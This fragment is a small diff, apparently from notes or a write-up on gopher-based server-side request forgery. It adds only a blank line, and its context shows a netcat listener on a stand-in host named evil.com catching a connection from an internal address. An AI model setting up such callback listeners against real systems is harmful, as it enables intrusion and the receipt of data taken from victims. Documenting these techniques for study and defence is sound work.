@@ -37,6 +37,7 @@ gopher:
 ?>
 
 evil.com:# nc -v -l 12346
+
 Listening on [0.0.0.0] (family 0, port 12346)
 Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
 HI
